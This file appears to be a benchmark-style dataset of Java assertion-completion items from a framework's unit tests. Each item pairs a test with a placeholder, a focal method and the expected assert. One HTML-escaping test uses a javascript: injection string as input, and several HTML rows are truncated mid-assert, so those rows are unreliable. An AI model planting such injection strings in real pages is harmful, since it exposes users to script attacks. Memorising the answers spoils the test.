put(String attributeName, Object value) { if (has(attributeName)) { getValueNode(attributeName).set(value); } else { newValueNode(attributeName, value).create(); } }"	"assertEquals(true, entity.getBoolean(""foo""))"
"testGetBoolean_nullValue() { DoEntity entity = BEANS.get(DoEntity.class); entity.put(""bar"", null); ""<AssertPlaceHolder>""; }
put(String attributeName, Object value) { if (has(attributeName)) { getValueNode(attributeName).set(value); } else { newValueNode(attributeName, value).create(); } }"	"assertNull(entity.getBoolean(""bar""))"
"testGetBooleanList_nullValue() { DoEntity entity = BEANS.get(DoEntity.class); entity.putList(""bar"", null); ""<AssertPlaceHolder>""; }
putList(String attributeName, List<V> value) { if (has(attributeName)) { DoList<V> node = getListNode(attributeName); node.set(value); } else { newListNode(attributeName, value).create(); } }"	"assertTrue(entity.getBooleanList(""bar"").isEmpty())"
"testGetBooleanList_nullItemValue() { DoEntity entity = BEANS.get(DoEntity.class); List<Object> list = newListWithOneNullValue(); entity.putList(""bar"", list); ""<AssertPlaceHolder>""; }
putList(String attributeName, List<V> value) { if (has(attributeName)) { DoList<V> node = getListNode(attributeName); node.set(value); } else { newListNode(attributeName, value).create(); } }"	"assertNull(entity.getBooleanList(""bar"").get(0))"
"testGetDecimal_nullValue() { DoEntity entity = BEANS.get(DoEntity.class); entity.put(""bar"", null); ""<AssertPlaceHolder>""; }
put(String attributeName, Object value) { if (has(attributeName)) { getValueNode(attributeName).set(value); } else { newValueNode(attributeName, value).create(); } }"	"assertNull(entity.getDecimal(""bar""))"
"testGetDecimalList_nullValue() { DoEntity entity = BEANS.get(DoEntity.class); entity.putList(""bar"", null); ""<AssertPlaceHolder>""; }
putList(String attributeName, List<V> value) { if (has(attributeName)) { DoList<V> node = getListNode(attributeName); node.set(value); } else { newListNode(attributeName, value).create(); } }"	"assertTrue(entity.getDecimalList(""bar"").isEmpty())"
"testGetDecimalList_nullItemValue() { DoEntity entity = BEANS.get(DoEntity.class); List<Object> list = newListWithOneNullValue(); entity.putList(""bar"", list); ""<AssertPlaceHolder>""; }
putList(String attributeName, List<V> value) { if (has(attributeName)) { DoList<V> node = getListNode(attributeName); node.set(value); } else { newListNode(attributeName, value).create(); } }"	"assertNull(entity.getDecimalList(""bar"").get(0))"
"testPutIf() { DoEntity expected = BEANS.get(DoEntity.class); expected.put(""foo1"", ""value1""); expected.put(""foo3"", ""value3"");  DoEntity actual = BEANS.get(DoEntity.class); actual.putIf(""foo1"", ""value1"", Objects::nonNull); actual.putIf(""foo2"", null, Objects::nonNull); actual.putIf(""foo3"", ""value3"", Objects::nonNull);  ""<AssertPlaceHolder>""; }
put(String attributeName, Object value) { if (has(attributeName)) { getValueNode(attributeName).set(value); } else { newValueNode(attributeName, value).create(); } }"	assertEqualsWithComparisonFailure(expected, actual)
"testGet() { String one = m_entity.get(""one""); ""<AssertPlaceHolder>""; }
get(String attributeName) { return mapValue(super.get(attributeName)); }"	"assertEquals(""foo"", one)"
"testGetEnumNameToClassMapItems() { ""<AssertPlaceHolder>""; }
getEnumNameToClassMap() { return Collections.unmodifiableMap(m_enumNameToClassMap); }"	"assertEquals(AlphabetFixture.class, m_inventory.getEnumNameToClassMap().get(""scout.AlphabetFixture""))"
"testGetEnumNameToClassMapSize() { ""<AssertPlaceHolder>""; }
getEnumNameToClassMap() { return Collections.unmodifiableMap(m_enumNameToClassMap); }"	assertEquals(1, m_inventory.getEnumNameToClassMap().size())
"testInit() { EnumInventory inv = BEANS.get(EnumInventory.class); ""<AssertPlaceHolder>""; }
toEnumName(Class<?> queryClazz) { return m_classToEnumName.get(queryClazz); }"	"assertEquals(""scout.AlphabetFixture"", inv.toEnumName(AlphabetFixture.class))"
"testCreateStringId() { String str = ""aaabbbccc""; FixtureStringId id = BEANS.get(IdFactory.class).createInternal(FixtureStringId.class, str); ""<AssertPlaceHolder>""; }
createInternal(Class<ID> idClass, Object... values) { try { Method createMethod = lookupCreateMethod(idClass); return idClass.cast(createMethod.invoke(null, values)); } catch (Exception e) { throw BEANS.get(PlatformExceptionTranslator.class).translate(e) .withContextInfo(""idClass"", idClass.getName()) .withContextInfo(""values"", Arrays.toString(values)); } }"	assertEquals(str, id.unwrap())
"testCreateStringId_NullValue() { String str = null; FixtureStringId id = BEANS.get(IdFactory.class).createInternal(FixtureStringId.class, str); ""<AssertPlaceHolder>""; }
createInternal(Class<ID> idClass, Object... values) { try { Method createMethod = lookupCreateMethod(idClass); return idClass.cast(createMethod.invoke(null, values)); } catch (Exception e) { throw BEANS.get(PlatformExceptionTranslator.class).translate(e) .withContextInfo(""idClass"", idClass.getName()) .withContextInfo(""values"", Arrays.toString(values)); } }"	assertNull(id)
"testCreateFixtureStringId_CustomOf() { String str = ""aaabbbccc""; FixtureStringId_RawTypesOf id = BEANS.get(IdFactory.class).createInternal(FixtureStringId_RawTypesOf.class, str); ""<AssertPlaceHolder>""; }
createInternal(Class<ID> idClass, Object... values) { try { Method createMethod = lookupCreateMethod(idClass); return idClass.cast(createMethod.invoke(null, values)); } catch (Exception e) { throw BEANS.get(PlatformExceptionTranslator.class).translate(e) .withContextInfo(""idClass"", idClass.getName()) .withContextInfo(""values"", Arrays.toString(values)); } }"	assertEquals(str, id.unwrap())
"testCreateFixtureUuId() { UUID uuid = UUID.fromString(""144a0317-8cb5-40b2-981f-1fae0781715f""); FixtureUuId id = BEANS.get(IdFactory.class).createInternal(FixtureUuId.class, uuid); ""<AssertPlaceHolder>""; }
createInternal(Class<ID> idClass, Object... values) { try { Method createMethod = lookupCreateMethod(idClass); return idClass.cast(createMethod.invoke(null, values)); } catch (Exception e) { throw BEANS.get(PlatformExceptionTranslator.class).translate(e) .withContextInfo(""idClass"", idClass.getName()) .withContextInfo(""values"", Arrays.toString(values)); } }"	assertEquals(uuid, id.unwrap())
"testCreateFixtureLongId() { Long value = Long.valueOf(42); FixtureLongId id = BEANS.get(IdFactory.class).createInternal(FixtureLongId.class, value); ""<AssertPlaceHolder>""; }
createInternal(Class<ID> idClass, Object... values) { try { Method createMethod = lookupCreateMethod(idClass); return idClass.cast(createMethod.invoke(null, values)); } catch (Exception e) { throw BEANS.get(PlatformExceptionTranslator.class).translate(e) .withContextInfo(""idClass"", idClass.getName()) .withContextInfo(""values"", Arrays.toString(values)); } }"	assertEquals(value, id.unwrap())
"testEnumTextResolver() { ""<AssertPlaceHolder>""; }
enumTextResolver() { return e -> e == null ? null : e.text(); }"	assertNull(LookupHelper.enumTextResolver().apply(null))
"testParse() { DoEntity entity = s_testHelper.parse(JSON, DoEntity.class); ""<AssertPlaceHolder>""; }
parse(String json, Class<T> valueType) { return s_dataObjectMapper.get().readValue(json, valueType); }"	assertEqualsWithComparisonFailure(s_entity, entity)
"testCloneT() { ""<AssertPlaceHolder>""; }
clone(T dataObject) { return s_dataObjectHelper.get().clone(dataObject); }"	assertEqualsWithComparisonFailure(s_entity, s_testHelper.clone(s_entity))
"testNoBounce() { MailMessage mailMessage = BEANS.get(MailMessage.class) .withSubject(""lorem"") .withSender(BEANS.get(MailParticipant.class).withEmail(""sender@example.org"")) .addToRecipient(BEANS.get(MailParticipant.class).withEmail(""recipient@example.org"")) .withBodyPlainText(""Lorem ipsum"");  ""<AssertPlaceHolder>""; }
test(MimeMessage mimeMessage) { Assertions.assertNotNull(mimeMessage, ""Mime message must be set"");  if (checkIsDsnBounce(mimeMessage)) { return true; } if (checkIsNonStandardBounce(mimeMessage)) { return true; }  return false; }"	assertFalse(BEANS.get(MailBounceDetector.class).test(BEANS.get(MailHelper.class).createMimeMessage(mailMessage)))
"MessagingException { MailMessage mailMessage = BEANS.get(MailMessage.class) .withSubject(""lorem"") .withSender(BEANS.get(MailParticipant.class).withEmail(""postmaster@example.org"")) .addToRecipient(BEANS.get(MailParticipant.class).withEmail(""recipient@example.org"")) .withBodyPlainText(""Lorem ipsum"");  // only sender criteria matches (still two missing) MimeMessage mimeMessage = BEANS.get(MailHelper.class).createMimeMessage(mailMessage); mimeMessage.addHeader(""Return-Path"", ""sender@example.org""); ""<AssertPlaceHolder>""; }
test(MimeMessage mimeMessage) { Assertions.assertNotNull(mimeMessage, ""Mime message must be set"");  if (checkIsDsnBounce(mimeMessage)) { return true; } if (checkIsNonStandardBounce(mimeMessage)) { return true; }  return false; }"	assertFalse(BEANS.get(MailBounceDetector.class).test(mimeMessage))
"MessagingException { MailMessage mailMessage = BEANS.get(MailMessage.class) .withSubject(""undeliverable"") .withSender(BEANS.get(MailParticipant.class).withEmail(""sender@example.org"")) .addToRecipient(BEANS.get(MailParticipant.class).withEmail(""recipient@example.org"")) .withBodyPlainText(""Lorem ipsum"");  // only subject criteria matches (still two missing) MimeMessage mimeMessage = BEANS.get(MailHelper.class).createMimeMessage(mailMessage); mimeMessage.addHeader(""Return-Path"", ""sender@example.org""); ""<AssertPlaceHolder>""; }
test(MimeMessage mimeMessage) { Assertions.assertNotNull(mimeMessage, ""Mime message must be set"");  if (checkIsDsnBounce(mimeMessage)) { return true; } if (checkIsNonStandardBounce(mimeMessage)) { return true; }  return false; }"	assertFalse(BEANS.get(MailBounceDetector.class).test(mimeMessage))
"MessagingException { MailMessage mailMessage = BEANS.get(MailMessage.class) .withSubject(""undeliverable"") .withSender(BEANS.get(MailParticipant.class).withEmail(""postmaster@example.org"")) .addToRecipient(BEANS.get(MailParticipant.class).withEmail(""recipient@example.org"")) .withBodyPlainText(""Lorem ipsum"");  // only subject and sender criteria matches (still one missing) MimeMessage mimeMessage = BEANS.get(MailHelper.class).createMimeMessage(mailMessage); mimeMessage.addHeader(""Return-Path"", ""sender@example.org""); ""<AssertPlaceHolder>""; }
test(MimeMessage mimeMessage) { Assertions.assertNotNull(mimeMessage, ""Mime message must be set"");  if (checkIsDsnBounce(mimeMessage)) { return true; } if (checkIsNonStandardBounce(mimeMessage)) { return true; }  return false; }"	assertFalse(BEANS.get(MailBounceDetector.class).test(mimeMessage))
"testNonStandardBounceSubjectSenderReturnPath() { MailMessage mailMessage = BEANS.get(MailMessage.class) .withSubject(""undeliverable"") .withSender(BEANS.get(MailParticipant.class).withEmail(""postmaster@example.org"")) .addToRecipient(BEANS.get(MailParticipant.class).withEmail(""recipient@example.org"")) .withBodyPlainText(""undeliverable"");  // sender, subject and return path criteria matches (reached 3 criterias to detect as bounce) ""<AssertPlaceHolder>""; }
test(MimeMessage mimeMessage) { Assertions.assertNotNull(mimeMessage, ""Mime message must be set"");  if (checkIsDsnBounce(mimeMessage)) { return true; } if (checkIsNonStandardBounce(mimeMessage)) { return true; }  return false; }"	assertTrue(BEANS.get(MailBounceDetector.class).test(BEANS.get(MailHelper.class).createMimeMessage(mailMessage)))
"MessagingException { MimeMessage mimeMessage = createMimeMessageUsingUnknownEncoding(); Assert.""<AssertPlaceHolder>""; }
getPlainText(Part message) { List<Part> bodyParts = getBodyParts(message); Part plainTextPart = getPlainTextPart(bodyParts); return readContentAsString(plainTextPart); }"	"assertEquals(""a"", BEANS.get(MailHelper.class).getPlainText(mimeMessage))"
"MessagingException { MailMessage mailMessage = BEANS.get(MailMessage.class) .withBodyPlainText(""lorem"");  MimeMessage message = BEANS.get(MailHelper.class).createMimeMessage(mailMessage); BEANS.get(MailHelper.class).ensureFromAddress(message, null);  ""<AssertPlaceHolder>""; }
ensureFromAddress(MimeMessage message, String defaultFromEmail) { try { Address[] fromAddresses = message.getFrom(); if (fromAddresses != null && fromAddresses.length != 0) { // From address is already set return; }  if (StringUtility.hasText(defaultFromEmail)) { message.setFrom(createInternetAddress(defaultFromEmail)); } } catch (MessagingException e) { throw new ProcessingException(""Couldn't apply 'default from' to message"", e); } }"	"assertNull(""No 'from'"", message.getFrom())"
"testGetPlainText() { MailHelper mailHelper = BEANS.get(MailHelper.class);  MimeMessage mimeMessage = mailHelper.createMimeMessage(BEANS.get(MailMessage.class).withBodyPlainText(""plain text body\näpfel\nŻółw"").withBodyHtml(""<html><body>html body<br>äpfel<br>Żółw<body></html>"")); ""<AssertPlaceHolder>""; }
getPlainText(Part message) { List<Part> bodyParts = getBodyParts(message); Part plainTextPart = getPlainTextPart(bodyParts); return readContentAsString(plainTextPart); }"	"assertEquals(""plain text body\näpfel\nŻółw"", mailHelper.getPlainText(mimeMessage))"
"testGetHtmlBody() { MailHelper mailHelper = BEANS.get(MailHelper.class);  MimeMessage mimeMessage = mailHelper.createMimeMessage(BEANS.get(MailMessage.class).withBodyPlainText(""plain text body\näpfel\nŻółw"").withBodyHtml(""<html><body>html body<br>äpfel<br>Żółw<body></html>"")); ""<AssertPlaceHolder>""; }
getHtmlBody(Part message) { List<Part> bodyParts = getBodyParts(message); Part htmlPart = getHtmlPart(bodyParts); return readContentAsString(htmlPart); }"	"assertEquals(""<html><body>html body<br>äpfel<br>Żółw<body></html>"", mailHelper.getHtmlBody(mimeMessage))"
"testEmptyContentDisposition() { String eml = """" + ""To: lorem@exampleorg\n"" + ""From: ipsum@example.org\n"" + ""MIME-Version: 1.0\n"" + ""Content-Type: text/plain; charset=utf-8\n"" + ""Content-Disposition: \n"" + ""Content-Transfer-Encoding: 7bit\n"" + ""\n"" + ""Lorem"";  MailHelper helper = BEANS.get(MailHelper.class); MimeMessage message = helper.createMessageFromBytes(eml.getBytes(StandardCharsets.UTF_8)); ""<AssertPlaceHolder>""; // failed with jakarta.mail.internet.ParseException: Expected disposition, got null }
getPlainText(Part message) { List<Part> bodyParts = getBodyParts(message); Part plainTextPart = getPlainTextPart(bodyParts); return readContentAsString(plainTextPart); }"	"assertEquals(""Lorem"", helper.getPlainText(message))"
"testAsciiConvertionWithoutSpecialChar() { // Arrange String emailAddress = ""someone@example.com"";  // Act String convertedAddress = BEANS.get(MailIDNConverter.class).toASCII(emailAddress);  // Assert ""<AssertPlaceHolder>""; }
toASCII(String email) { return convertToCharset(email, IDN::toASCII); }"	assertEquals(emailAddress, convertedAddress)
"testAsciiConvertionWithSpecialCharInLocalPart() { // Arrange String emailAddress = ""sömeöne@example.com"";  // Act String convertedAddress = BEANS.get(MailIDNConverter.class).toASCII(emailAddress);  // Assert ""<AssertPlaceHolder>""; }
toASCII(String email) { return convertToCharset(email, IDN::toASCII); }"	assertEquals(emailAddress, convertedAddress)
"testAsciiConvertionWithSpecialChar() { // Arrange String emailAddress = ""sömeone@exämple.com""; String punycodeAddress = ""sömeone@xn--exmple-cua.com"";  // Act String convertedAddress = BEANS.get(MailIDNConverter.class).toASCII(emailAddress);  // Assert ""<AssertPlaceHolder>""; }
toASCII(String email) { return convertToCharset(email, IDN::toASCII); }"	assertEquals(punycodeAddress, convertedAddress)
"testUnicodeConvertionWithSpecialChar() { // Arrange String punycodeAddress = ""sömeöne@xn--exmple-cua.com""; String emailAddress = ""sömeöne@exämple.com"";  // Act String convertedAddress = BEANS.get(MailIDNConverter.class).toUnicode(punycodeAddress);  // Assert ""<AssertPlaceHolder>""; }
toUnicode(String email) { return convertToCharset(email, IDN::toUnicode); }"	assertEquals(emailAddress, convertedAddress)
"testEmpty() { Map<String, String> context = new HashMap<>();  String jsonText = (String) BEANS.get(JsonDataObjectMarshaller.class).marshall(BEANS.get(DoEntity.class), context); ""<AssertPlaceHolder>""; }
unmarshall(final Object data, final Map<String, String> context) { return m_dataObjectMapper.readValue(assertType(data, String.class), IDataObject.class); }"	assertEquals(BEANS.get(DoEntity.class), BEANS.get(JsonDataObjectMarshaller.class).unmarshall(jsonText, context))
"testNull() { Map<String, String> context = new HashMap<>();  String jsonText = (String) BEANS.get(JsonDataObjectMarshaller.class).marshall(null, context); ""<AssertPlaceHolder>""; }
unmarshall(final Object data, final Map<String, String> context) { return m_dataObjectMapper.readValue(assertType(data, String.class), IDataObject.class); }"	assertNull(BEANS.get(JsonDataObjectMarshaller.class).unmarshall(jsonText, context))
"testNotSerializableObject() { Map<String, String> context = new HashMap<>(); try { BEANS.get(ObjectMarshaller.class).marshall(new Object(), context); fail(""NotSerializableException expected""); } catch (Exception e) { MatcherAssert.""<AssertPlaceHolder>""; } }
marshall(final Object transferObject, final Map<String, String> context) { if (transferObject == null) { return null; }  try { final IObjectSerializer serializer = SerializationUtility.createObjectSerializer(); final byte[] bytes = serializer.serialize(transferObject);  context.put(CTX_PROP_OBJECT_TYPE, transferObject.getClass().getName()); return bytes; } catch (final IOException e) { throw BEANS.get(DefaultRuntimeExceptionTranslator.class).translate(e); } }"	assertThat(e.getCause(), is(instanceOf(NotSerializableException.class)))
"testEmpty() { ObjectMarshaller marshaller = BEANS.get(ObjectMarshaller.class); Map<String, String> context = new HashMap<>();  byte[] bytes = (byte[]) marshaller.marshall("""", context); ""<AssertPlaceHolder>""; }
unmarshall(final Object data, final Map<String, String> context) { final byte[] bytes = (byte[]) data; if (bytes == null) { return null; }  try { final Class<?> objectType = Class.forName(context.get(CTX_PROP_OBJECT_TYPE)); final IObjectSerializer serializer = SerializationUtility.createObjectSerializer(); return serializer.deserialize(bytes, objectType); } catch (final IOException | ClassNotFoundException e) { throw BEANS.get(DefaultRuntimeExceptionTranslator.class).translate(e); } }"	"assertEquals("""", marshaller.unmarshall(bytes, context))"
"testNull() { ObjectMarshaller marshaller = BEANS.get(ObjectMarshaller.class); Map<String, String> context = new HashMap<>();  byte[] bytes = (byte[]) marshaller.marshall(null, context); ""<AssertPlaceHolder>""; }
unmarshall(final Object data, final Map<String, String> context) { final byte[] bytes = (byte[]) data; if (bytes == null) { return null; }  try { final Class<?> objectType = Class.forName(context.get(CTX_PROP_OBJECT_TYPE)); final IObjectSerializer serializer = SerializationUtility.createObjectSerializer(); return serializer.deserialize(bytes, objectType); } catch (final IOException | ClassNotFoundException e) { throw BEANS.get(DefaultRuntimeExceptionTranslator.class).translate(e); } }"	assertNull(marshaller.unmarshall(bytes, context))
"testGetServiceHighestRanking() { ITestService service = BEANS.get(ITestService.class); ""<AssertPlaceHolder>""; }
get(Class<T> beanClazz) { return Assertions.assertNotNull(opt(beanClazz), ""no instance found for query: {}"", beanClazz); }"	"assertEquals(""Service with highest ranking expected."", TestService3.class, service.getClass())"
"testGetServiceNull() { IUnregisteredTestService service = BEANS.get(IUnregisteredTestService.class); ""<AssertPlaceHolder>""; }
get(Class<T> beanClazz) { return Assertions.assertNotNull(opt(beanClazz), ""no instance found for query: {}"", beanClazz); }"	"assertNull(""No service should be found. "", service)"
"testGetServicesNull() { List<IUnregisteredTestService> services = BEANS.all(IUnregisteredTestService.class); ""<AssertPlaceHolder>""; }
all(Class<T> beanClazz) { return all(beanClazz, null); }"	"assertEquals(""No services should be found. "", 0, services.size())"
"testSystemResolveProperty() { PropertiesHelper instance = new PropertiesHelper(new ConfigPropertyProvider(SAMPLE_CONFIG_PROPS)); final String attrOtherSystemPropertyKey = ""attrOtherSystemPropertyKey""; try { System.setProperty(ATTR_STRING_KEY, ""property ${"" + attrOtherSystemPropertyKey + ""}""); System.setProperty(attrOtherSystemPropertyKey, ""resolved"");  ""<AssertPlaceHolder>"";  System.setProperty(ATTR_STRING_KEY, ""property ${"" + ATTR_LONG_KEY + ""}""); System.setProperty(attrOtherSystemPropertyKey, ""property "" + 777); } finally { System.clearProperty(ATTR_STRING_KEY); System.clearProperty(attrOtherSystemPropertyKey); } }
getProperty(String key) { return getProperty(key, null); }"	"assertEquals(""property resolved"", instance.getProperty(ATTR_STRING_KEY))"
"testEnvironmentOverrideWithDotSupport() { final String overridableProperty = ""overridable.with.dotproperty"";  // Since Environment variables with dots (.) are not posix-compliant, PropertiesHelper realInstance = new PropertiesHelper(new ConfigPropertyProvider(DOTPROPERTY_PROPS)); PropertiesHelper spiedInstance = spy(realInstance); when(spiedInstance.getEnvironmentVariable(overridableProperty)).thenReturn(""2"");  ""<AssertPlaceHolder>""; }
getProperty(String key) { return getProperty(key, null); }"	"assertEquals(""2"", spiedInstance.getProperty(overridableProperty))"
"testEnvironmentOverrideWithoutDotSupport() { // Replaced with underscore. final String overridableProperty = ""overridable_with_dotproperty"";  // Mock environment variables PropertiesHelper realInstance = new PropertiesHelper(new ConfigPropertyProvider(DOTPROPERTY_PROPS)); PropertiesHelper spiedInstance = spy(realInstance); when(spiedInstance.getEnvironmentVariable(overridableProperty)).thenReturn(""2"");  final String originalProperty = ""overridable.with.dotproperty""; ""<AssertPlaceHolder>""; }
getProperty(String key) { return getProperty(key, null); }"	"assertEquals(""2"", spiedInstance.getProperty(originalProperty))"
"testEnvironmentOverrideWithUppercase() { // Replaced with underscore. final String overridableProperty = ""OVERRIDABLE.WITH.DOTPROPERTY"";  // Since Environment variables with dots (.) are not posix-compliant, PropertiesHelper realInstance = new PropertiesHelper(new ConfigPropertyProvider(DOTPROPERTY_PROPS)); PropertiesHelper spiedInstance = spy(realInstance); when(spiedInstance.getEnvironmentVariable(overridableProperty)).thenReturn(""2"");  final String originalProperty = ""overridable.with.dotproperty""; ""<AssertPlaceHolder>""; }
getProperty(String key) { return getProperty(key, null); }"	"assertEquals(""2"", spiedInstance.getProperty(originalProperty))"
"testEnvironmentOverrideWithUppercaseWithoutDotSupport() { // Replaced with underscore. final String overridableProperty = ""OVERRIDABLE_WITH_DOTPROPERTY"";  // Since Environment variables with dots (.) are not posix-compliant, PropertiesHelper realInstance = new PropertiesHelper(new ConfigPropertyProvider(DOTPROPERTY_PROPS)); PropertiesHelper spiedInstance = spy(realInstance); when(spiedInstance.getEnvironmentVariable(overridableProperty)).thenReturn(""2"");  final String originalProperty = ""overridable.with.dotproperty""; ""<AssertPlaceHolder>""; }
getProperty(String key) { return getProperty(key, null); }"	"assertEquals(""2"", spiedInstance.getProperty(originalProperty))"
"testNull() { ""<AssertPlaceHolder>""; }
transformException(Throwable t) { // first, go to exception stack and reverse it List<Throwable> throwableStack = new ArrayList<>(); while (t != null) { throwableStack.add(0, t); t = t.getCause(); }  // second, transform each exception so that they do not use probably // proprietary exception classes Throwable cause = null; for (Throwable throwable : throwableStack) { Throwable transformedThrowable = null;  if (throwable instanceof ProcessingException) { ProcessingException pe = null; IProcessingStatus oldStatus = ((ProcessingException) throwable).getStatus(); ProcessingStatus newStatus = (oldStatus instanceof ProcessingStatus ? (ProcessingStatus) oldStatus : new ProcessingStatus(oldStatus)); newStatus.setException(cause); try { pe = (ProcessingException) transformWellKnownException(throwable, cause, newStatus); } catch (RuntimeException fatal) { // NOSONAR // nop } if (pe == null) { pe = new ProcessingException(); } transformedThrowable = pe.withStatus(newStatus); } else if (throwable.getClass().getPackage() != null && throwable.getClass().getPackage().getName().startsWith(""java."")) { transformedThrowable = transformWellKnownException(throwable, cause, null); }  if (transformedThrowable == null) { transformedThrowable = new PlaceholderException(throwable, cause); }  transformedThrowable.setStackTrace(throwable.getStackTrace()); cause = transformedThrowable; } return cause; }"	assertNull(PlaceholderException.transformException(null))
"testWithContextInfo() { PlatformException exception = new PlatformException(""exception""); exception .withContextInfo(""key1"", ""value 1"") .withContextInfo(""key2"", ""value {}"", 2) .withContextInfo(""key3"", ""value 3"");  ""<AssertPlaceHolder>""; }
getContextInfos() { return CollectionUtility.arrayList(m_contextInfos); }"	"assertEquals(Arrays.asList(""key1=value 1"", ""key2=value 2"", ""key3=value 3""), exception.getContextInfos())"
"test2() { when(m_filter1.test(any())).thenReturn(true); ""<AssertPlaceHolder>""; }
test(final ELEMENT element) { for (final Predicate<ELEMENT> filter : m_filters) { if (!filter.test(element)) { return false; } } return true; }"	assertTrue(new AndFilter<>(m_filter1).test(new Object()))
"test3() { when(m_filter1.test(any())).thenReturn(false); ""<AssertPlaceHolder>""; }
test(final ELEMENT element) { for (final Predicate<ELEMENT> filter : m_filters) { if (!filter.test(element)) { return false; } } return true; }"	assertFalse(new AndFilter<>(m_filter1).test(new Object()))
"test4() { when(m_filter1.test(any())).thenReturn(true); when(m_filter2.test(any())).thenReturn(true); when(m_filter3.test(any())).thenReturn(true); ""<AssertPlaceHolder>""; }
test(final ELEMENT element) { for (final Predicate<ELEMENT> filter : m_filters) { if (!filter.test(element)) { return false; } } return true; }"	assertTrue(new AndFilter<>(m_filter1, m_filter2, m_filter3).test(new Object()))
"test5() { when(m_filter1.test(any())).thenReturn(true); when(m_filter2.test(any())).thenReturn(false); when(m_filter3.test(any())).thenReturn(true); ""<AssertPlaceHolder>""; }
test(final ELEMENT element) { for (final Predicate<ELEMENT> filter : m_filters) { if (!filter.test(element)) { return false; } } return true; }"	assertFalse(new AndFilter<>(m_filter1, m_filter2, m_filter3).test(new Object()))
"testLinkNoRel() { String html = HTML.link(TEST_URL, HTML_TEXT, true).toHtml(); ""<AssertPlaceHolder>"";"") + """">"" + escape(HTML_TEXT) + ""</a>"", html); }
link(CharSequence url, CharSequence text, boolean preserveOpener) { return new HtmlLinkBuilder(url, text, preserveOpener); }"	"assertEquals(""<a href="""" + TEST_URL.replace("""""", ""&quot"
"testLinkNoBinds() { String html = HTML.link(TEST_URL, HTML_TEXT).toHtml(); ""<AssertPlaceHolder>"";"") + """" rel=""noreferrer noopener"">"" + escape(HTML_TEXT) + ""</a>"", html); }
link(CharSequence url, CharSequence text) { return link(url, text, false); }"	"assertEquals(""<a href="""" + TEST_URL.replace("""""", ""&quot"
"testImageNoBinds() { String html = HTML.img(""logo.png"").toHtml(); ""<AssertPlaceHolder>""; }
img(CharSequence src) { return new HtmlImageBuilder(src); }"	"assertEquals(""<img src=""logo.png"" alt="""">"", html)"
"testBr() { IHtmlElement br = HTML.br(); ""<AssertPlaceHolder>""; }
br() { return new EmptyHtmlNodeBuilder(""br""); }"	"assertEquals(""<br>"", br.toHtml())"
"testAddAttribute() { IHtmlElement span = HTML.span(""text"").addAttribute(""name"", ""value""); ""<AssertPlaceHolder>""; }
span(CharSequence... text) { return new HtmlNodeBuilder(""span"", text); }"	"assertEquals(""<span name=""value"">text</span>"", span.toHtml())"
"testAddBooleanAttribute() { IHtmlElement span = HTML.span(""text"").addBooleanAttribute(""name""); ""<AssertPlaceHolder>""; }
span(CharSequence... text) { return new HtmlNodeBuilder(""span"", text); }"	"assertEquals(""<span name>text</span>"", span.toHtml())"
"testAppLinkNoBinds() { final IHtmlElement html = HTML.appLink(""domain=123&text=456"", ""Link Text&""); ""<AssertPlaceHolder>"";</span>"", html.toHtml()); }
appLink(CharSequence ref, CharSequence text) { return span(text).appLink(ref); }"	"assertEquals(""<span class=""app-link"" data-ref=""domain=123&text=456"">Link Text&amp"
"testAppLinkWithQuote() { final IHtmlElement html = HTML.appLink(""domain=123""text=456"", ""Link Text<a href=""javascript:window.alert('bad');"">test</a>""); ""<AssertPlaceHolder>"";text=456"">Link Text&lt;a href=&quot;javascript:window.alert(&#39;bad&#39;);&quot;&gt;test&lt;&#47;a&gt;</span>"", html.toHtml()); }
appLink(CharSequence ref, CharSequence text) { return span(text).appLink(ref); }"	"assertEquals(""<span class=""app-link"" data-ref=""domain=123&quot"
"testBoldAppLink() { final IHtmlElement html = HTML.bold(""asdf"", HTML.appLink(""domain=123&text=456"", ""Link Text&"")); ""<AssertPlaceHolder>"";</span></b>"", html.toHtml()); }
appLink(CharSequence ref, CharSequence text) { return span(text).appLink(ref); }"	"assertEquals(""<b>asdf<span class=""app-link"" data-ref=""domain=123&text=456"">Link Text&amp"
"testTableNoBinds() { String html = HTML.table(tr(td(HTML_TEXT))).toHtml(); ""<AssertPlaceHolder>""; }
td(CharSequence... text) { return new HtmlTableDataBuilder(Arrays.asList(text)); }"	"assertEquals(""<table><tr><td>"" + escape(HTML_TEXT) + ""</td></tr></table>"", html)"
"testTableAttributesNoBinds() { final IHtmlTable table = HTML.table(tr(td(HTML_TEXT))); ""<AssertPlaceHolder>""; }
td(CharSequence... text) { return new HtmlTableDataBuilder(Arrays.asList(text)); }"	"assertEquals(""<table><tr><td>"" + escape(HTML_TEXT) + ""</td></tr></table>"", table.toHtml())"
"testLinkWithBoldNoBinds() { final IHtmlElement html = HTML.bold(HTML_TEXT, link(TEST_URL, HTML_TEXT)); ""<AssertPlaceHolder>"";<a href=""http://SCOUTBLABLA.com&quot;"" rel=""noreferrer noopener"">Test Last Name&amp;</a></b>"", html.toHtml()); }
link(CharSequence url, CharSequence text) { return link(url, text, false); }"	"assertEquals(""<b>Test Last Name&amp"
"testMultipleCellsNoBinds() { IHtmlTableRow row1 = HTML.tr(HTML.td(""p1""), HTML.td(""p2"")); ""<AssertPlaceHolder>""; }
td(CharSequence... text) { return new HtmlTableDataBuilder(Arrays.asList(text)); }"	"assertEquals(""<tr><td>p1</td><td>p2</td></tr>"", row1.toString())"
"testCellWithColspan() { IHtmlTableRow row = HTML.tr(HTML.td(""1"").colspan(2), HTML.td(""2"")); ""<AssertPlaceHolder>""; }
td(CharSequence... text) { return new HtmlTableDataBuilder(Arrays.asList(text)); }"	"assertEquals(""<tr><td colspan=""2"">1</td><td>2</td></tr>"", row.toHtml())"
"testComplexHtml() { final IHtmlElement html = HTML.div(link(TEST_URL, HTML_TEXT), HTML.table(tr(td(HTML_TEXT), td(HTML_TEXT), td(HTML_TEXT)))); String expected = ""<div><a href=""http://SCOUTBLABLA.com&quot;"" rel=""noreferrer noopener"">Test Last Name&amp;</a><table><tr><td>Test Last Name&amp;</td><td>Test Last Name&amp;</td><td>Test Last Name&amp;</td></tr></table></div>""; ""<AssertPlaceHolder>""; }
td(CharSequence... text) { return new HtmlTableDataBuilder(Arrays.asList(text)); }"	assertEquals(expected, html.toHtml())
"testUl() { String html = HTML.ul(HTML.li(HTML_TEXT)).toHtml(); ""<AssertPlaceHolder>""; }
lic static IHtmlListElement li(CharSequence text) { return new HtmlListElement(text); }"	"assertEquals(""<ul><li>"" + ESCAPED_HTML_TEXT + ""</li></ul>"", html)"
"testMultipleUl() { String html = HTML.ul(HTML.li(HTML_TEXT), HTML.li(""2"")).toHtml(); ""<AssertPlaceHolder>""; }
